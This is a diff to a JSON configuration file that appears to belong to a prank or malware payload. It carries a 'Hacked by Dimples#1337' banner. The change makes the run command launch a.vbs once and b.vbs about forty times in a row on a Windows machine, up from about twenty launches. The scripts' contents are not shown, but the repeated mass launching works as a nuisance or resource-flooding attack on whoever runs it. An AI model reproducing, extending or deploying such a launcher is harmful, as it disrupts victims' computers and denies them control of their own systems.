@@ -25,6 +25,6 @@
     "text": "Hacked by Dimples#1337"
   },
   "run": {
-    "command": "start $rundir\\a.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\n"
+    "command": "start $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\a.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nexit"
   }
 }
